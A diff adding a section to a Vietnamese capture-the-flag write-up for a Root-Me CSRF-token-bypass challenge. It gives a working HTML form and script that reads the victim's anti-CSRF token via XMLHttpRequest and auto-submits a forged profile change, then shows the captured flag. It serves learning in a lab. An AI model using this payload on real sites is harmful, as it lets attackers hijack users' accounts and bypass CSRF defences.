@@ -288,9 +288,48 @@ Bây giờ ta cần gửi 1 form tương tự để lừa admin kick vào link t
 Activate your account to access intranet.
 
 ```
-Dạng này thực sự thì mình chưa hiểu lm nên là có tham khảo writeup.
+Dạng này thực sự thì mình chưa hiểu lm nên là có tham khảo writeup để học thêm kiến thức.
 Thì cũng như bài trên nhưng bài này đã có lớp phòng thủ, ta phải submit 1 dynamic token vào form của ta nữa.
+Vẫn bắt đầu với form: 
 
+```
+<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
+                <input id="username" type="text" name="username" value="huy123">
+                <input id="status" type="checkbox" name="status" checked >
+                <input id="token" type="hidden" name="token" value="" />
+                <button type="submit">Submit</button>
+</form>
+
+```
+Đoạn scipt ta bổ sung thêm:
+
+```
+<script>
+
+                xhttp = new XMLHttpRequest();
+                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
+                xhttp.send();
+
+             
+                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
+
+                document.getElementById('token').setAttribute('value', token_admin)
+
+                document.csrf_form.submit();
+</script>
+
+```
+
+Trong đó thì ở đây khởi tạo 1 đối tượng XMLHttpRequest() để mở 'http://challenge01.root-me.org/web-client/ch23/?action=profile' với phương thức GET
+Ở đây XMLHttRequest() cho phép ta xử lí thao tác gửi và nhận từ một máy chủ web bất đồng bộ mà kh cần phải tải lại trang web hay toàn bộ trang.
+Ngoài ra để ý tham số thứ 3 là 'false' ở đây có tác dụng bật chế độ đồng bộ, tức sẽ chờ xử lí xong đã rồi mới tiếp tục thực hiện tiếp.
+Sau đó gửi yêu cầu cho máy chủ. 
+Bước tiếp theo dùng match để tìm kiếm một chuỗi có 32 ký tự ứng từ a-z0-9, thực chất là sẽ phải thử lần lượt cho đến khi được thì thôi, nếu có thì sẽ được gán vào biến admin.
+Sau khi có được token rồi thì ta nộp form như bài trước là ra được flag: 
+
+![image](https://user-images.githubusercontent.com/104350480/220264495-97ddc300-76a1-4aa5-ac5b-bd09fad105e1.png)
+
+> Flag: Byp4ss_CSRF_T0k3n-w1th-XSS
 
 ## Chall 6: XSS - Stored - filter bypass
 
